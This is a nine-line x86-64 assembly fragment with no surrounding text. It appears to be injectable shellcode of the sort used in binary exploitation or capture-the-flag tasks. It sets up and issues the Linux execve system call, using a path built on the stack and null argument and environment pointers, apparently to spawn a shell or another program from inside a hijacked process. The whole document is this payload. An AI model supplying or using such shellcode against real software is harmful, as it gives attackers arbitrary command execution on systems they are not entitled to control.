.global _start
_start:
.intel_syntax noprefix
mov al, 0x3b
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
